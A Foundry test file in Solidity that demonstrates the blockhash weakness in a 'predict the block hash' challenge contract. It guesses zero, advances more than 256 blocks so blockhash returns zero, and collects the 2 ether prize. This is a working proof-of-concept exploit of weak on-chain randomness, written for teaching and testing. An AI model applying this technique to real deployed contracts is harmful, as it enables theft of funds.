
// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

import {Test} from "../lib/forge-std/src/Test.sol";
import {PredictTheBlockHashChallenge} from "../src/PredictTheBlockHashChallenge.sol";

contract TestWeakRandomnessPredictTheBlockHashChallenge is Test {
    PredictTheBlockHashChallenge public _contractUnderTest;

    function setUp() public {
        vm.deal(address(this), 2 ether);
        _contractUnderTest = new PredictTheBlockHashChallenge{value: 1 ether}();
    }

    function test_highlightPredictableRandomValue(uint256 blockNumber) public {
        uint256 startBlock = block.number;
        
        vm.assume(blockNumber > startBlock + 256);
        
        vm.deal(address(this), 100 ether);
        
        _contractUnderTest.lockInGuess{value: 1 ether}(0);
        
        vm.roll(blockNumber);
        
        uint256 initialBalance = address(this).balance;
        _contractUnderTest.settle();
        uint256 finalBalance = address(this).balance;
        
        assertEq(
            finalBalance - initialBalance,
            2 ether,
            "Randomness should be predictable given block state"
        );
    }
}
